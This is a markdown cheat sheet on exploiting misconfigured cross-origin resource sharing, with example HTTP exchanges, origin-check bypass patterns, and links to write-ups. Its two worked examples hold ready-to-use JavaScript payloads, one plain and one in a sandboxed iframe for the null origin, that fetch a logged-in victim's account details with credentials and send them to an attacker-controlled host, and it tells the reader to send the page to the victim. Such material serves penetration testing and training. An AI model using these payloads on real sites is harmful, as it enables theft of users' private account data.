# Cross-origin resource sharing (CORS)

>Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy [SOP](https://portswigger.net/web-security/cors/same-origin-policy). However, it also provides potential for cross-domain based attacks, if a website's CORS policy is poorly configured and implemented.



## Summary

- [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
  - [Summary](#summary)
  - [Exploit](#exploit)
    - [Bypass all domains ending with `vulnerable-website.com`](#bypass-all-domains-ending-with-vulnerable-websitecom)
    - [Bypass all domains beginning with  `vulnerable-website.com`](#bypass-all-domains-beginning-with-vulnerable-websitecom)
    - [Awesome writeups :fire:](#awesome-writeups-fire)
  - [References](#references)

## Exploit

:fire: **Example 1:**

***Request***

```bash
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
```
***Response***

```bash
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
```

**Note**
> the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS

***Modified Request***

```bash
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
Origin: https://your-website.com
```

***Response***

```bash
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://your-website.com
Access-Control-Allow-Credentials: true
```

then you add this code to a website you control :


```bash
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script> 
```
**note :**
replace `$url` with `vulnerable-website.com`

=> **send the website to the victim**

**Now** if the victim is logged in `vulnerable-website.com` and he visit your website ... you get his `accountDetails`


:fire: **Example 2:**

***Request***

```bash
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
```

***Response***

```bash
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
```

**Notice no "Access-Control-Allow-Origin" in response**

***Modified Request***

```bash
GET /accountDetails HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

***Response***
```bash
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**POC**

```bash
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='$exploitUrl/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

**Note :** 

Replace `$url` with : `vulnerable-website.com`

Replace `$exploitUrl` with : `https://malicious-website.com`

=> send the website to the victim



 ### Bypass all domains ending with `vulnerable-website.com`

  ```bash
  anything-vulnerable-website.com
  ```
 ### Bypass all domains beginning with  `vulnerable-website.com`

```bash
  vulnerable-website.com.anything.com
  ```



### Awesome writeups :fire:

[Think Outside the Scope: Advanced CORS Exploitation Techniques](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
[Tricky CORS Bypass in Yahoo! View](https://www.corben.io/tricky-CORS/)



## References
* [Portswigger](https://portswigger.net/web-security/cors)
